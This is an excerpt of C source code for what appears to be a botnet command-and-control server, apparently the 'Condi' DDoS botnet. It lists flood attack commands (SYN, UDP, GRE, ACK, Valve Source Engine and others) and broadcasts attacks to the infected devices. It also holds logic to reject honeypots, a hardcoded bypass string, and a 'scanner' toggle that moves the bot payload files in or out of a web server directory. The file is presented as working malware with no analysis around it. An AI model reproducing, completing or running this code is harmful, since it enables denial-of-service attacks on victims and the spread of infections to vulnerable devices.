...
#define USER_COMMANDS   10
#define ADMIN_COMMANDS  5
...
struct clientdata_t
{
    ...
    char connected, arch[64];
} clients[MAXFDS];

struct accountinfo_t
{
    char username[128], password[128], floods[128], lastcmd[512], lastflood[256], *rdbuf; //128
...
char *user_commands[USER_COMMANDS][2] = {
    {" .synflood   | syn flood\r\n"},
    {" .udpthread  | udp flood with threadings\r\n"},
    {" .udpplain   | udp plain flood\r\n"},
    {" .pps        | udp flood optimize for high pps\r\n"},
    {" .vseflood   | valve source engine specific flood\r\n"},
    {" .greflood   | gre ip flood\r\n"},
    {" .ackflood   | ack flood\r\n"},
    {" .sackflood  | custom ack flood\r\n"},
    {" .tcpflood   | tcp flood\r\n"},
    {" .tcplegit   | real tcp flood\r\n"}
};

char *admin_commands[ADMIN_COMMANDS][2] = {
    {"\r\nfloods <enable/disable>", "enable or disable attacking."},
    {"scanner <enable/disable>", "enable or disable scanner."},
    {"bot", "view total bots."},
    {"user", "list user info from user database."},
    {"onl", "view current connected users.\r\n"},
};
...
int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    ...
    else
    {
        ...
        sprintf(prompt, "attack sent successfully to %d devices.\r\n", sentto);
...
void sendbanner(int myfd)
{
    ...
    sprintf(line2, "\x1b[37m< Hello, welcome to botnet! \r\n");
    sprintf(line3, "\x1b[37m --------------------------  \r\n");
    sprintf(line4, "\x1b[37m       |   ^__^ \r\n");
    sprintf(line5, "\x1b[37m         | (oo) ------- \r\n");
    sprintf(line6, "\x1b[37m           (__)        )-- \r\n");
    sprintf(line7, "\x1b[37m               ||----w | \r\n");
    sprintf(line8, "\x1b[37m               ||     || \r\n\r\n");
...
void *tab_title_admin(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;%d devices | owner | %d/%d running\007", botcount, attkcount, MAX_ATTACKS);
...
void *tab_title_user(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;%d devices | member | %d/%d running\007", botcount, attkcount, MAX_ATTACKS);
            ...
            else if (listen_fd == events[i].data.fd)
            {
                while (1)
                {
                    ...
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                    {
                        ...
                        {
                            printf("(condi/cnc) Duplicate Deleted \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                            close(event.data.fd);
                            break;
                        }
                    }
                ...
                while (1)
                {
                    ...
                    while ((count = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL)) > 0)
                    {
                        ...
                        if (*buf_ptr++ == '\x33' &&  *buf_ptr++ == '\x66' && *buf_ptr++ == '\x99')
                        {
                            ...
                            {
                                printf("[cnc] Honeypot Declined\x1b[37m (Blacklist) %d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
...
void *detect_afk(void *arg)
{
    ...
    while(1)
    {
        ...
        {
            char fbuf[512];
            sprintf(fbuf, "long time no using cnc, disconnected.\n");
            write(the_fd, fbuf, strlen(fbuf));
...
void *controller_thread(void *arg)
{
    ...
    char rdbuf[512], username[256], password[256], hidden[256], prompt[256];
    char *apibypass = "!2023!";
    ...
    write(accinfo[cfd].fd, "\x1b[33mUsername \x1b[31m->\x1b[37m ", strlen("\x1b[33mUsername \x1b[31m->\x1b[37m "));
    read(accinfo[cfd].fd, username, sizeof(username));
    write(accinfo[cfd].fd, "\x1b[33mPassword \x1b[31m->\x1b[37m ", strlen("\x1b[33mPassword \x1b[31m->\x1b[37m "));
    ...
    for(x = 0; x < MAXFDS; x++)
    {
        ...
        if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[37m%s\x1b[31m@\x1b[33mbotnet \x1b[31m~/\x1b[37m ", username);
        else
            sprintf(prompt, "\x1b[37m%s\x1b[31m@\x1b[33mbotnet \x1b[31m~/\x1b[37m ", username);
    ...
    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo[cfd].fd, rdbuf, sizeof(rdbuf)) > 0)
    {
        ...
        if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
        {
            ...
            else
            {
                ...
                if ((args2_len = split(accinfo[cfd].floods, ',', &arguments2)) <= 0)
                {
                    ...
                    free(arguments2);
                    write(accinfo[cfd].fd, "error, pls contact admin.\r\n", strlen("error, pls contact admin.\r\n"));
                }
                ...
                if (atk_count == 0)
                    write(accinfo[cfd].fd, "maximium concurrents.\r\n", strlen("maximium concurrents.\r\n"));
        ...
        else if ((strcmp(rdbuf, "bot") == 0 || strcmp(rdbuf, "botcount") == 0) && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
        ...
        else if ((strcmp(rdbuf, "onl") == 0) && accinfo[cfd].admin == 1)
        {
            char tempbuf[2048];
            int f;
            for(f = 0; f < MAXFDS; f++)
        ...
        else if ((strcmp(rdbuf, "user") == 0 || strcmp(rdbuf, "userlist") == 0) && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
        ...
        else if (strcmp(rdbuf, "scanner enable") == 0 && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            write(accinfo[cfd].fd, "\x1b[38;5;231menabled scanner.\r\n", strlen("\x1b[38;5;231menabled scanner.\r\n"));
            system("mv /var/www/html/[!i]* /var/www/html/condi");
        }
        else if (strcmp(rdbuf, "scanner disable") == 0 && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            write(accinfo[cfd].fd, "\x1b[38;5;231mdisabled scanner.\r\n", strlen("\x1b[38;5;231mdisabled scanner.\r\n"));
            system("mv /var/www/html/condi/* /var/www/html");
        }
        ...
        else if (rdbuf[0] == '.')
        {
            ...
            write(accinfo[cfd].fd, "uknown command.\r\n", strlen("uknown command.\r\n"));
